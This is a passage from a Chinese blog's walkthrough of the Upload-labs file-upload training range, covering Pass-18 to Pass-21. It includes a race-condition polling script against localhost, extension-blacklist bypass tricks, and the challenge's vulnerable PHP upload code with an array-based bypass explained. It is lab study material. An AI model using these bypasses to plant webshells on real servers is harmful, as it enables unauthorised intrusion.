<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713211329914.4aixqz393oo0.png">    </p>
<p>先开启我们的脚本，等待上传：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://localhost/UP/upload/shell1.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>然后开始启动Burp的多线程上传</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713210549000.5fhc5dfsvy80.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713210628761.5jgzvewq9b40.png"></p>
<p>可以看到脚本已经返回OK,说明它已经执行了我们的payload，也就是生成了一个<code>Shell.php</code>，我们访问它试试：这里显示的<code>shell.php</code>但是我们上传的是<code>Shell.php</code>，是因为Windows的特性</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230713211634318.h7qysyrm6zc.png"></p>
<h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><blockquote>
<p>条件竞争+图片马绕过</p>
</blockquote>
<p>如总结，因为这俩题型都做过了，这个题目只不过是杂糅起来。但是这个比较鸡肋，还是得依托于文件包含漏洞。</p>
<h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1><blockquote>
<p>自定义名称+黑名单绕过</p>
</blockquote>
<p>可以用的方法：大写绕过、后缀名加点绕过、<code>::$DATA</code> 绕过、空格绕过</p>
<h1 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h1><blockquote>
<p>代码审计，代码层面的数组绕过</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是对MIME进行了限制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>重点的漏洞在这几串代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在处理之前，使用 <code>explode(&#39;.&#39;, strtolower($file))</code> 将字符串按照点号 <code>.</code> 进行拆分，生成一个包含文件名和扩展名的数组。<code>strtolower()</code> 函数将文件名转换为小写，以确保扩展名的一致性。</p>
<p>接下来，使用 <code>end($file)</code> 获取数组 <code>$file</code> 中的最后一个元素，即文件的扩展名。将扩展名赋值给变量 <code>$ext</code>，以便后续验证使用。</p>
<p>定义了一个允许的文件扩展名数组 <code>$allow_suffix</code>，包含了允许的扩展名（例如：<code>jpg</code>、<code>png</code>、<code>gif</code>）。</p>
<p>通过使用 <code>in_array($ext, $allow_suffix)</code> 来检查文件的扩展名是否在允许的扩展名列表中。如果文件的扩展名不在列表中，则将变量 <code>$msg</code> 设置为 “禁止上传该后缀文件!”，表示不允许上传该文件类型。</p>
<p>如果文件的扩展名在允许的扩展名列表中，将通过 <code>reset($file)</code> 获取数组 <code>$file</code> 的第一个元素，即文件名部分。然后通过连接文件名和扩展名生成新的文件名，并将其赋值给变量 <code>$file_name</code>。</p>
</blockquote>
<p>当我们主动上传的是数组,文件扩展名的利用的<code>count($file) - 1</code>来获取,我们就进行<code>中间空一个</code>截断的方式来绕过.</p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230715092335984.5z75x68s9sc0.png"></p>
<p><img lazyload alt="image" data-src="https://github.com/C2yb8er/picx-images-hosting/raw/master/20230716/c2yb8erimage-20230715092516404.8t639uspz10.png"></p>
<p>一点php小知识：</p>
<blockquote>
<p><code>var_dump()</code> 和 <code>echo()</code> 是用于在 PHP 中输出变量内容的两个不同的函数，它们在功能和用法上有一些区别。</p>
<ol>
<li>功能：<ul>
<li><code>var_dump()</code>：用于显示变量的详细信息，包括变量的数据类型、长度和值等。它通常用于调试和开发过程中，帮助开发人员了解变量的结构和内容。</li>
<li><code>echo()</code>：用于将字符串或表达式的值输出到屏幕上。它用于向用户显示文本和变量的值，常用于网页开发和输出简单的调试信息。</li>
</ul>
</li>
<li>输出格式：<ul>
<li><code>var_dump()</code>：输出的信息格式更为详细和全面，包括变量的数据类型、长度和值等。它会将变量的结构以更直观的方式展示出来，适合用于调试和了解变量的内部结构。</li>
<li><code>echo()</code>：输出的信息较简洁，仅输出字符串或表达式的值。它通常用于输出简单的文本和变量的值，以便在网页上显示给用户。</li>
</ul>
</li>
<li>返回值：<ul>
<li><code>var_dump()</code>：不返回任何值，只是将变量的详细信息直接输出到屏幕上。</li>
<li><code>echo()</code>：不返回任何值，仅将字符串或表达式的值输出到屏幕上。</li>
</ul>
</li>
<li>使用场景：<ul>
<li><code>var_dump()</code>：适用于调试过程中，可以帮助开发人员了解变量的结构和内容，查看变量的数据类型和值等详细信息。</li>
<li><code>echo()</code>：适用于向用户显示文本和变量的值，用于输出简单的消息和内容，如显示网页上的文本、变量值等。</li>
</ul>
</li>
</ol>
<p>需要注意的是，<code>var_dump()</code> 通常用于开发和调试目的，而不适合直接输出给最终用户。在生产环境中，应谨慎使用 <code>var_dump()</code>，以避免意外泄露敏感信息给用户。</p>
<p>总而言之，<code>var_dump()</code> 提供了更详细的变量信息，适用于调试和开发过程，而 <code>echo()</code> 则用于向用户显示简单的文本和变量值。选择使用哪个函数取决于您的需求和使用场景。</p>
</blockquote>

            </div>

            
                <div class="post-copyright-info">
                    <div class="article-copyright-info-container">
    <ul class="copyright-info-content">
        <li>
            <span class="type">本文标题</span>：<span class="content">Upload-labs靶场学习记录</span>
        </li>
        <li>
            <span class="type">本文作者</span>：<span class="content">二十八华生</span>
        </li>
        <li>
            <span class="type">创建时间</span>：<span class="content">2023-07-12 08:47:15</span>
        </li>
        <li class="post-link">
            <span class="type">本文链接</span>：<span class="content">2023/07/12/Upload-labs学习记录/</span>
        </li>
        <li>
            <span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span>
        </li>
    </ul>
</div>

                </div>
            

            
                <ul class="post-tags-box">
                    
                        <li class="tag-item">
                            <a href="/tags/Upload-labs%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">#Upload-labs靶场学习记录</a>&nbsp;
                        </li>
                    
                </ul>
            

            
                <div class="article-nav">
                    
                        <div class="article-prev">
                            <a class="prev"
                               rel="prev"
                               href="/2023/10/18/EDUSRC-%E4%B8%80-%EF%BC%9A%E6%9F%90985%E8%AF%81%E4%B9%A6%E7%AB%99%E6%8C%96%E6%8E%98%E8%AE%B0%E5%BD%95/"
                            >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                                <span class="title flex-center">
                                <span class="post-nav-title-item">EDUSRC(一)：某985证书站挖掘记录</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                            </a>
                        </div>
                    
                    
                        <div class="article-next">
                            <a class="next"
                               rel="next"
                               href="/2023/07/10/crAPI%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"
                            >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">crAPI靶场学习记录</span>
                                <span class="post-nav-item">下一篇</span>
                            </span>
                                <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                            </a>
                        </div>
                    
                </div>
            

            
        </div>

        
            <div class="toc-content-container">
                <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-01"><span class="nav-text">Pass-01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E7%A6%81%E7%94%A8%E5%89%8D%E7%AB%AFJS%E5%87%BD%E6%95%B0"><span class="nav-text">方法一：禁用前端JS函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E4%BC%AA%E9%80%A0%E5%9B%BE%E7%89%87Burp%E6%8B%A6%E6%88%AA%E4%BF%AE%E6%94%B9"><span class="nav-text">方法二：伪造图片Burp拦截修改</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-02"><span class="nav-text">Pass-02</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E5%85%85MIME%E7%9F%A5%E8%AF%86"><span class="nav-text">补充MIME知识</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-03"><span class="nav-text">Pass-03</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E4%B8%AD%E5%BE%97%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-text">做题中得到的信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%BA%90%E7%A0%81"><span class="nav-text">查看源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%90%8C%E7%AD%89%E6%89%A9%E5%B1%95%E5%90%8D%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="nav-text">方法一：使用同等扩展名进行绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Upload-General-Methodology"><span class="nav-text">File Upload General Methodology</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="nav-text">方法二:上传图片马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A-DATA-%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="nav-text">方法三：::$DATA 嵌套绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-04"><span class="nav-text">Pass-04</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85"><span class="nav-text">相关知识补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%9D%E8%AF%95%E7%94%A8-DATA%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87%E4%BD%86%E7%BB%95%E4%B8%8D%E8%BF%87"><span class="nav-text">尝试用::$DATA嵌套绕过但绕不过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-05"><span class="nav-text">Pass-05</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-06"><span class="nav-text">Pass-06</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-07"><span class="nav-text">Pass-07</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-08"><span class="nav-text">Pass-08</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-09"><span class="nav-text">Pass-09</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-10"><span class="nav-text">Pass-10</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-11"><span class="nav-text">Pass-11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-12"><span class="nav-text">Pass-12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-13"><span class="nav-text">Pass-13</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-14"><span class="nav-text">Pass-14</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8010-Editor%E5%88%B6%E4%BD%9C%E5%9B%BE%E7%89%87%F0%9F%90%8E%E2%80%93PNG-JPG-GIF"><span class="nav-text">使用010 Editor制作图片🐎–PNG&#x2F;JPG&#x2F;GIF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-15"><span class="nav-text">Pass-15</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B9%E8%BF%9B%E6%96%B9%E6%B3%95"><span class="nav-text">改进方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-16"><span class="nav-text">Pass-16</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-17"><span class="nav-text">Pass-17</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%B6%E4%BD%9CGIF%F0%9F%90%8E%E8%BF%87%E7%A8%8B"><span class="nav-text">制作GIF🐎过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%B6%E4%BD%9CPNG%F0%9F%90%8E%E8%BF%87%E7%A8%8B"><span class="nav-text">制作PNG🐎过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%B6%E4%BD%9CJPG%F0%9F%90%8E%E8%BF%87%E7%A8%8B"><span class="nav-text">制作JPG🐎过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-18"><span class="nav-text">Pass-18</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-19"><span class="nav-text">Pass-19</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-20"><span class="nav-text">Pass-20</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pass-21"><span class="nav-text">Pass-21</span></a></li></ol>
    </div>
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            
<footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
                <span>2023</span> -
            
            2024
            
                &nbsp;<i class="fas fa-heart icon-animate"></i>
                &nbsp;<a href="/">二十八华生</a>
            
        </div>
        
            <script async data-pjax
                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                
                    总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
                
            </div>
        
        <div class="theme-info info-item">
            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="fas fa-arrow-up"></i>
            </li>
        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="搜索..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.5.2/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
